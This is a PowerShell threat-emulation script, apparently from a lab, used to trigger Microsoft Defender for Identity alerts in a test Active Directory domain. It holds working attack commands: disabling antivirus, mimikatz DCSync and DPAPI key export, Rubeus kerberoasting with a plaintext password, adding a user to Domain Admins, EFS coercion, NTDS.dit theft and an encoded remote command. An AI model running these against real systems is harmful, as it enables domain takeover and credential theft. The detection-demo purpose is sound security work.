# This information was compiled and borrowed from a number of different online sources used to demo threat protection for MDI
# Sources: 
# - https://jeffreyappel.nl/how-to-implement-defender-for-identity-and-configure-all-prerequisites/

# Be sure to DEFANG MDAV (Microsoft Defender Antivirus) before running these tools on the endpoint
# The Win10 client is domain joined with the domain user having local admin privs

# Create C:\tools file share on DC - RCCE-SVR19-1
# Copy the contents from \\RCCE-SVR19-1\tools to C:\Tools
Copy-Item -Path "\\RCCE-SVR19-1\tools\*" -Destination "C:\tools\" -Recurse -Force

# DOWNLOAD THREAT EMULATION TOOLS
Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" -OutFile "C:\tools\mkz.zip"

Invoke-WebRequest -Uri "https://github.com/ANSSI-FR/ORADAD/releases/download/3.3.210/ORADAD.zip" -OutFile "C:\tools\ORADAD.zip"

#Invoke-WebRequest -Uri "https://raw.github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe" -OutFile "C:\tools\Rubeus.exe"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Flangvik/SharpCollection/master/NetFramework_4.7_Any/Rubeus.exe" -OutFile "C:\tools\Rubeus.exe"

Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile "C:\tools\PSTools.zip"


# UNZIP TE TOOLS
Expand-Archive -Path "C:\tools\mkz.zip" -DestinationPath "C:\tools\mkz\"

Expand-Archive -Path "C:\tools\ORADAD.zip" -DestinationPath "C:\tools\oradad\"

Expand-Archive -Path "C:\tools\PSTools.zip" -DestinationPath "C:\tools\pstools\"


# ------------- EMULATE VARIOUS THREATS ----------------

# AD Reconnaissance
# https://www.joeware.net/freetools/tools/netsess/
netsess.exe cloudhunters.local

# ------------------------------------------------------
# Network mapping reconnaissance (DNS)
nslookup 
server cloudhunters.local
ls -d cloudhunters.local

# User and IP address reconnaissance
NetSess.exe cloudhunters.local

# Enumeration of AD environment & sensitive groups
net user /domain 
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain 
net group "Schema Admins" /domain

# Suspicious additions to sensitive groups
net user RonHD Passw0rd123 /FULLNAME:"Ron HD" /DOMAIN /add
Invoke-Command -ComputerName RCCE-WKS-1 -ScriptBlock { net localgroup Administrators cloundhunters.local\RonHD /add }

Add-ADGroupMember -Identity "Domain Admins" -Members RonHD

Get-ADUser -Identity "ronhd" -Properties LockedOut | Select-Object SamAccountName, LockedOut

# Acquire Data Protection DPAPI Keys
mimikatz # privilege::debug
mimikatz # lsadump::backupkeys /system:cloudhunters.local /export

# Recon for kerberoasting opportuntities
c:\Tools\ORADAD\ORADAD.exe

# Emulate a DCSync attack (replicate directory services)
C:\tools\mkz\mimikatz.exe "lsadump::dcsync /domain:cloudhunters.local /user:krbtgt" "exit"

# Honey Token Activity
# Assign a user account in AD as a Honey Token in MDI, then log in and observe the activity.
# This is conducted in the Defender XDR portal: Settings -> Identities -> HoneyTokens -> Add

# Suspected Kerberos SPN exposure (Kerberoasting)
C:\tools\Rubeus.exe kerberoast /dc:RCCE-SVR19-1 /creduser:cloudhunters.local\jjbottles /credpassword:Passw0rd123

# Suspicious network connection over Encrypting File System Remote Protocol
C:\tools\mkz\x64\mimikatz.exe "privilege::debug" "misc::efs /server:RCCE-SVR19-1 /connect:172.16.0.10 /noauth" "exit"

# Data Exfiltration of NTDS.DIT file for offline cracking
C:\tools\pstools\PsExec.exe \\RCCE-SVR19-1 -accepteula -sid c:\windows\system32\Esentutl.exe /y /i c:\Windows\NTDS\ntds.dit /d c:\tools\ntds.dit /vssrec ; Copy-Item -Path "\\RCCE-SVR19-1\tools\ntds.dit" -Destination "C:\tools"

# Remote Code Execution attempts
winrs /r:RCCE-SVR19-1 "powershell -NonInteractive -OutputFormat xml -NoProfile -EncodedCommand RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAFcAaQBuADMAMgBfAFMAaABhAHIAZQAgAC0AUAByAG8AcABlAHIAdAB5ACAATgBhAG0AZQAsAFMAdABhAHQAdQBzACwAUABhAHQAaAAgAC0ATgBhAG0AZQBzAHAAYQBjAGUAIABSAE8ATwBUAFwAYwBpAG0AdgAyACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABDAG8AbgB0AGkAbgB1AGUAIAB8ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBDAFMAVgAgAC0ATgBvAFQAeQBwAGUASQBuAGYAbwByAG0AYQB0AGkAbwBuAA=="


# REMOVE FOLDERS IF NEED BE
Remove-Item -Path "C:\tools\oradad" -Recurse -Force
Remove-Item -Path "C:\tools\pstools" -Recurse -Force
Remove-Item -Path "C:\tools\mkz" -Recurse -Force
